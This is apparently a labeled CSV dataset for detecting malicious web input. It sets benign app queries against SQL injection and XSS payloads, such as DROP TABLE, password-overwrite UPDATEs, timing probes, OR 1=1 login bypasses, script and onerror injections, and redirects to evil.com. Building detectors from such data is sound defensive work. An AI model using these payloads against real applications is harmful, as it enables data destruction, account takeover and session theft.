text,label
filter results by about,0
upload image smartphones,0
"1' UNION ALL SELECT NULL,NULL--",1
import contacts mobile apps,0
1'; DELETE FROM products WHERE 1=1--,1
<img src=x:alert(1) onerror=eval(src)>,1
import contacts report_january,0
create new post about xml,0
description=<embed src=javascript:alert(1)>,1
update profile name to services,0
name=<marquee onstart=alert(1)>,1
sort items by user123,0
save settings for csv,0
1' and 1=1--,1
<select onfocus=alert(1) autofocus>,1
upload image json,0
filter results by json,0
search books about database design,0
save settings for user123,0
search books about data science,0
search books about xml,0
message=<div onmouseover=alert(1)>hover</div>,1
message=<object data=javascript:alert(1)>,1
delete item id data science,0
description=<script>document.cookie</script>,1
filter results by morning,0
id=' AND 1=(SELECT COUNT(*) FROM users)--,1
1' and 1=1--,1
name=<body onload=alert('XSS')>,1
name=<img src=x:alert(1) onerror=eval(src)>,1
fetch product details web development,0
"<iframe src=data:text/html,<script>alert(1)</script>>",1
user login with username contact,0
search query for web development,0
create new post about pdf,0
sync calendar invoice_2024,0
' AND 1=(SELECT COUNT(*) FROM users)--,1
comment=<embed src=javascript:alert(1)>,1
message=<textarea onfocus=alert(1) autofocus>,1
create new post about report_january,0
import contacts user123,0
message=<svg><script>alert(1)</script></svg>,1
'; DROP TABLE users--,1
filter results by machine learning,0
search books about web development,0
<script>window.location='http://evil.com'</script>,1
"1' union all select null,null--",1
'; DROP TABLE users--,1
create new post about machine learning,0
sync calendar contact,0
load data from smartphones,0
import contacts evening,0
comment=<script>window.location='http://evil.com'</script>,1
download file python programming,0
search='; UPDATE users SET password='hacked'--,1
username=' OR 'x'='x,1
sort items by services,0
username=1'; WAITFOR DELAY '00:00:05'--,1
search query for machine learning,0
description=<img src=x onerror=alert(1)>,1
search books about weekend,0
view page number contact,0
load data from weekday,0
create new post about database design,0
message=<input onfocus=alert(1) autofocus>,1
username=1'; WAITFOR DELAY '00:00:05'--,1
' OR '1'='1,1
message=javascript:alert('XSS'),1
message=<img src='x' onerror='alert(1)'>,1
save settings for python programming,0
<textarea onfocus=alert(1) autofocus>,1
description=<script>alert('XSS')</script>,1
id='; UPDATE users SET password='hacked'--,1
sync calendar dashboard_view,0
view page number machine learning,0
description=<script>alert('XSS')</script>,1
load data from xml,0
1' or '1'='1' /*,1
view page number morning,0
search=' OR 'x'='x,1
description=<embed src=javascript:alert(1)>,1
save settings for admin_panel,0
download file report_january,0
name=<img src=x:alert(1) onerror=eval(src)>,1
description=<svg><script>alert(1)</script></svg>,1
id=admin'#,1
sort items by services,0
comment=<iframe src=javascript:alert('XSS')>,1
search='; DROP TABLE users--,1
download file products,0
save settings for evening,0
load data from home,0
search query for machine learning,0
sync calendar machine learning,0
filter results by services,0
user login with username contact,0
export report data science,0
id=' OR SLEEP(5)--,1
name=<div onmouseover=alert(1)>hover</div>,1
search='; UPDATE users SET password='hacked'--,1
share link to electronics,0
create new post about contact,0
delete item id pdf,0
comment=<marquee onstart=alert(1)>,1
message=<svg/onload=alert(1)>,1
description=<img src=x onerror=alert(1)>,1
search=' OR '1'='1,1
export report home,0
save settings for weekend,0
get order status home,0
search query for pdf,0
1' UNION SELECT NULL--,1
' or sleep(5)--,1
<svg/onload=alert(1)>,1
search=1' AND 1=1--,1
description=<textarea onfocus=alert(1) autofocus>,1
1'; DELETE FROM products WHERE 1=1--,1
id=' OR 1=1 LIMIT 1--,1
1' or 1=1--,1
update profile name to products,0
description=<svg/onload=alert(1)>,1
message=<select onfocus=alert(1) autofocus>,1
delete item id dashboard_view,0
id=1' ORDER BY 10--,1
1'; waitfor delay '00:00:05'--,1
view page number products,0
view page number services,0
name=<script>alert('XSS')</script>,1
sync calendar contact,0
fetch product details products,0
comment=<script>window.location='http://evil.com'</script>,1
"comment=<iframe src=data:text/html,<script>alert(1)</script>>",1
view page number order_12345,0
create new post about smartphones,0
name=<div onmouseover=alert(1)>hover</div>,1
import contacts services,0
search query for pdf,0
sort items by data science,0
'; UPDATE USERS SET PASSWORD='HACKED'--,1
delete item id electronics,0
import contacts services,0
username=admin'--,1
